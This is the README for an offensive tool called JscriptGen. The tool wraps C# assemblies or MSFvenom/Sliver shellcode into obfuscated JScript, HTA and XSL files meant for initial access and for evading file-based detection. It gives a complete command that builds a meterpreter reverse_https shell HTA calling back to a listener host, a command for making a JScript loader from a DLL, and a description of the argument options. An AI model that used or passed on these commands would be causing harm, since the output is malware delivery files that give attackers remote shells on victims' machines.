# JscriptGen

A versatile generator for creating malicious script-based files (JS, HTA, XSL) by wrapping C# assemblies or shellcode using `DotNetToJScript`. This tool is particularly effective for initial access vectors that bypass common file-based detection mechanisms.

## Features
- **MSF/Sliver Support**: Automatically generates and compiles shellcode using MSFvenom or Sliver.
- **Assembly Wrapping**: Converts any C# DLL into a script-based payload.
- **Multiple Formats**: Supports JScript (`.js`), HTML Application (`.hta`), and XML Stylesheet (`.xsl`).
- **Automatic Obfuscation**: Incorporates basic obfuscation techniques within the generated scripts.

## Usage
Basic usage for an MSF reverse shell in HTA format:
```bash
python3 jscriptgen.py -p msf --msf-payload windows/x64/meterpreter/reverse_https --lhost 10.10.10.10 --lport 443 -f hta -o shell.hta
```

Wrapping a custom C# DLL into JScript:
```bash
python3 jscriptgen.py -p /path/to/payload.dll --is-assembly -f js -o loader.js
```

### Arguments
- `-p, --payload`: Type of payload or path to a custom binary/DLL.
- `-f, --format`: Output format (js, hta, xsl).
- `--lhost/--lport`: Network configuration for MSF/Sliver payloads.
- `--is-assembly`: Required when providing a custom C# DLL.

## Templates
- **bridge.cs**: The C# bridge used by DotNetToJScript.
- **delivery/**: Base templates for the different output formats.
